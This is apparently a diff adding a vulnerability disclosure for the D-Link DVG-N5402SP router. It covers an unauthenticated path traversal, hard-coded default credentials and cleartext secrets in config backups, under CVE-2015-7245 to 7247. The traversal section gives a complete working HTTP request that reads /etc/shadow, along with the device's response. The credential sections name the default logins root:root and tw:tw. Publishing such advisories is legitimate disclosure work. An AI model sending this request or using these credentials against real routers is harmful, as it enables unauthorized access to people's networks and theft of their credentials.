@@ -1,0 +1,95 @@
+# Exploit Title: [DLink DVG­N5402SP Multiple Vulnerabilities]
+# Discovered by: Karn Ganeshen
+# Vendor Homepage: [www.dlink.com/]
+# Versions Reported: [Multiple - See below]
+# CVE-IDs: [CVE-2015-7245 + CVE-2015-7246 + CVE-2015-7247]
+
+
+*DLink DVG­N5402SP File Path Traversal, Weak Credentials Management, and
+Sensitive Info Leakage Vulnerabilities*
+*Vulnerable Models, Firmware, Hardware versions*
+DVG­N5402SP Web Management
+Model Name : GPN2.4P21­C­CN
+Firmware Version : W1000CN­00
+Firmware Version :W1000CN­03
+Firmware Version :W2000EN­00
+Hardware Platform :ZS
+Hardware Version :Gpn2.4P21­C_WIFI­V0.05
+
+Device can be managed through three users:
+1. super ­ full privileges
+2. admin ­ full privileges
+3. support ­ restricted user
+
+*1. Path traversal*
+Arbitrary files can be read off of the device file system. No
+authentication is required to exploit this vulnerability.
+*CVE-ID*: CVE-2015-7245
+
+*HTTP Request *
+
+POST /cgi­bin/webproc HTTP/1.1
+Host: <IP>:8080
+User­Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101
+Firefox/39.0 Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept­Language: en­US,en;q=0.5
+Accept­Encoding: gzip, deflate
+Referer: http://<IP>:8080/cgi­bin/webproc
+Cookie: sessionid=abcdefgh; language=en_us; sys_UserName=super
+Connection: keep­alive
+Content­Type: application/x­www­form­urlencoded
+Content­Length: 223
+
+getpage=html%2Findex.html&*errorpage*=../../../../../../../../../../../etc/shadow&var%3Amenu=setup&var%3Apage=connected&var%
+&obj­action=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh
+
+*HTTP Response*
+
+HTTP/1.0 200 OK
+pstVal­>name:getpage; pstVal­>value:html/main.html
+pstVal­>name:getpage; pstVal­>value:html/index.html
+pstVal­>name:errorpage;
+pstVal­>value:../../../../../../../../../../../etc/shadow
+pstVal­>name:var:menu; pstVal­>value:setup
+pstVal­>name:var:page; pstVal­>value:connected
+pstVal­>name:var:subpage; pstVal­>value:­
+pstVal­>name:obj­action; pstVal­>value:auth
+pstVal­>name::username; pstVal­>value:super
+pstVal­>name::password; pstVal­>value:super
+pstVal­>name::action; pstVal­>value:login
+pstVal­>name::sessionid; pstVal­>value:1ac5da6b
+Connection: close
+Content­type: text/html
+Pragma: no­cache
+Cache­Control: no­cache
+set­cookie: sessionid=1ac5da6b; expires=Fri, 31­Dec­9999 23:59:59 GMT;
+path=/
+
+#root:<hash_redacted>:13796:0:99999:7:::
+root:<hash_redacted>:13796:0:99999:7:::
+#tw:<hash_redacted>:13796:0:99999:7:::
+#tw:<hash_redacted>:13796:0:99999:7:::
+
+
+*2. Use of Default, Hard­Coded Credentials**CVE-ID*: CVE-2015-7246
+
+The device has two system user accounts configured with default passwords
+(root:root, tw:tw).
+Login ­ tw ­ is not active though. Anyone could use the default password to
+gain administrative control through the Telnet service of the system (when
+enabled) leading to integrity, loss of confidentiality, or loss of
+availability.
+
+*3.Sensitive info leakage via device running configuration backup *
+*CVE-ID*: CVE-2015-7247
+
+Usernames, Passwords, keys, values and web account hashes (super & admin)
+are stored in clear­text and not masked. It is noted that restricted
+'support' user may also access this config backup file from the portal
+directly, gather clear-text admin creds, and gain full, unauthorized access
+to the device.
+-- 
+Best Regards,
+Karn Ganeshen
+ipositivesecurity.blogspot.in
